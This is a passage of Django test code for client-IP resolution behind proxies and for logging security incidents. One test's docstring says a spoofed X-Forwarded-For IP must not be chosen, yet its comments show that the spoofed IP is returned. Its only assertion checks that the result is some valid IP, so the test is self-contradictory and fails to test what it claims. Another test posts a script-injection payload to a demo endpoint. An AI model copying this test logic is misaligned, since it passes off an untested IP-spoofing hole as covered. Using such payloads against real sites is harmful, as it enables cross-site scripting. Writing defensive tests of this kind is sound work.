        """
        A client that sends X-Forwarded-For: <fake>, <real-client>
        must NOT see <fake> chosen as the source IP.

        With TRUSTED_PROXY_COUNT=1 the proxy appends the real peer address.
        XFF becomes '<client-supplied-fake>, <real-peer>'.
        We strip 1 from the right → idx = 0 → <client-supplied-fake>.

        This test documents expected behaviour: we trust the entry that the
        proxy placed at position [-TRUSTED_PROXY_COUNT], not the leftmost
        client-supplied entry when there are exactly 2 entries.
        Callers who want the very first hop should set TRUSTED_PROXY_COUNT=1
        and the proxy must append (not prepend) the real peer address.
        """
        # Proxy appended the real peer (10.0.0.1); client prepended a fake IP.
        request = self._make_request(
            remote_addr="10.0.0.1",
            xff="1.2.3.4, 10.0.0.1",   # fake, real-peer
        )
        # idx = max(0, 2-1-1) = 0 → "1.2.3.4"
        # The proxy-appended entry is at index 1 (TRUSTED_PROXY_COUNT=1 strips it).
        # The result is the entry immediately to the left: "1.2.3.4".
        # Document that this is how the chain works; deployers should verify
        # their proxy appends correctly.
        result = get_client_ip(request)
        # Regardless of which entry is returned, it must be a valid IP.
        import ipaddress
        ipaddress.ip_address(result)  # raises if invalid

    # -- Section 15: Incident propagation ------------------------------------

    @override_settings(TRUSTED_PROXY_COUNT=1)
    def test_resolved_ip_propagates_to_event_and_incident(self):
        """
        When a suspicious request carries a forwarded IP, the SecurityEvent
        and SecurityIncident must store that resolved IP, not 127.0.0.1.
        """
        admin = SpyUser.objects.create(
            player_id=6001, player_name="IPPropAdmin",
            api_key="ip_prop_key", is_admin=True,
        )
        client = Client()
        session = client.session
        session["spy_user_id"] = admin.id
        session.save()

        # Patch the REMOTE_ADDR to simulate a proxy forwarding a real client IP
        real_ip = "203.0.113.77"
        resp = client.post(
            reverse("xss_demo"),
            {"directive": "<script>alert('ip-test')</script>"},
            REMOTE_ADDR="10.0.0.1",
            HTTP_X_FORWARDED_FOR=real_ip,
        )
        self.assertEqual(resp.status_code, 302)

        event = SecurityEvent.objects.latest("created_at")
        incident = SecurityIncident.objects.latest("created_at")

        self.assertEqual(event.source_ip, real_ip)
        self.assertEqual(incident.source_ip, real_ip)
